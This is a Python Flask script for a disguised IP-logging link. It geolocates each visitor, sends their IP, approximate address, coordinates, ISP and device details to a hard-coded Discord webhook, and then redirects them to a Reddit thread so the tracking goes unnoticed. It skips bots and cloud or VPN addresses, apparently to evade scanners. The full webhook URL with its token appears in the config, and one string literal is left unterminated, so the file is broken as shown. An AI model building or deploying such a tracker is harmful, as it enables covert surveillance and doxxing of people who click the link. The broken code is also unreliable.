import requests
from flask import Flask, request, redirect
from datetime import datetime
import threading
import time

app = Flask(__name__)

# ===================== CONFIG =====================
DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDDIT_URL = "https://www.reddit.com/r/football/comments/y8xqif
# ===================== SETTINGS =====================
CLOUD_PROVIDERS = ["Amazon", "AWS", "Google Cloud", "DigitalOcean", "Hetzner", "Microsoft", "Azure", "Linode", "OVH"]
BOT_KEYWORDS = ["bot", "crawl", "spider", "wget", "curl", "python-requests"]

logged_ips_today = set()

# ===================== FUNCTIONS =====================
def get_real_ip():
    for header in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP"]:
        ip = request.headers.get(header)
        if ip:
            return ip.split(",")[0].strip()
    return request.remote_addr

def is_bot(user_agent: str) -> bool:
    ua = (user_agent or "").lower()
    return any(k in ua for k in BOT_KEYWORDS)

def is_cloud_ip(org: str) -> bool:
    return any(cloud.lower() in org.lower() for cloud in CLOUD_PROVIDERS)

def get_visitor_info(ip, user_agent):
    details = {}
    fallback_used = False
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        if r.status_code == 200:
            details = r.json()
        if not details.get("city"):
            r2 = requests.get(f"https://ipwhois.app/json/{ip}", timeout=5)
            if r2.status_code == 200:
                details = r2.json()
                fallback_used = True
        print(f"[DEBUG] IP info for {ip}: {details}, fallback: {fallback_used}")
    except Exception as e:
        print(f"[ERROR] IP lookup failed for {ip}: {e}")

    city = details.get("city") or "Unknown"
    region = details.get("region") or "Unknown"
    country = details.get("country_name") or "Unknown"
    postal = details.get("postal") or "Unknown"
    lat = details.get("latitude") or details.get("lat")
    lon = details.get("longitude") or details.get("lon")

    # Ensure Google Maps link works even if lat/lon missing
    if lat is None or lon is None:
        map_url = f"https://www.google.com/maps/search/{city}+{region}+{country}"
    else:
        map_url = f"https://www.google.com/maps?q={lat},{lon}"

    org = details.get("org") or details.get("asn_org") or "Unknown ISP"
    vpn_detected = is_cloud_ip(org)

    return {
        "ip": ip,
        "user_agent": user_agent,
        "city": city,
        "region": region,
        "country": country,
        "postal": postal,
        "lat": lat,
        "lon": lon,
        "org": org,
        "vpn": vpn_detected,
        "fallback_used": fallback_used,
        "map_url": map_url,
        "date": datetime.utcnow().strftime("%d/%m/%Y"),
        "time": datetime.utcnow().strftime("%H:%M:%S"),
    }

def send_to_discord(info, retries=3, delay=2):
    vpn_text = "Yes 🚨" if info['vpn'] else "No ✅"
    fallback_text = " (Fallback API)" if info['fallback_used'] else ""
    embed_color = 16711680 if info['vpn'] else 7506394

    payload = {
        "username": "🌍 Visitor Tracker",
        "embeds": [{
            "title": f"🚶 New Visitor from {info['country']}{fallback_text}",
            "color": embed_color,
            "fields": [
                {"name": "🖥️ IP Address", "value": f"`{info['ip']}`", "inline": False},
                {"name": "📍 Location", "value": f"{info['city']}, {info['region']} ({info['country']})\nPostal: {info['postal']}", "inline": False},
                {"name": "🏢 ISP / Organization", "value": info['org'], "inline": False},
                {"name": "📱 Device Info", "value": f"`{info['user_agent']}`", "inline": False},
                {"name": "🌍 Google Maps", "value": f"[Open Map]({info['map_url']})", "inline": False},
                {"name": "🛡️ VPN / Proxy Detected", "value": vpn_text, "inline": False},
            ],
            "footer": {"text": f"Logged at {info['date']} {info['time']} GMT"}
        }]
    }

    for attempt in range(1, retries + 1):
        try:
            resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
            print(f"[INFO] Discord webhook attempt {attempt}: status {resp.status_code}")
            if 200 <= resp.status_code < 300:
                break
        except Exception as e:
            print(f"[ERROR] Discord webhook attempt {attempt} failed: {e}")
        if attempt < retries:
            time.sleep(delay)

# ===================== FLASK ROUTE =====================
@app.route('/')
def index():
    ip = get_real_ip()
    user_agent = request.headers.get("User-Agent", "Unknown")

    if is_bot(user_agent):
        return redirect(REDDIT_URL)

    # Skip known cloud IPs like Google servers
    visitor_info = get_visitor_info(ip, user_agent)
    if visitor_info['vpn']:
        print(f"[INFO] Skipped cloud/VPN IP: {ip}")
        return redirect(REDDIT_URL)

    if ip in logged_ips_today:
        return redirect(REDDIT_URL)

    logged_ips_today.add(ip)
    send_to_discord(visitor_info)

    return redirect(REDDIT_URL)

# ===================== DAILY RESET =====================
def clear_logged_ips():
    global logged_ips_today
    logged_ips_today = set()
    threading.Timer(86400, clear_logged_ips).start()

clear_logged_ips()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000, debug=False)
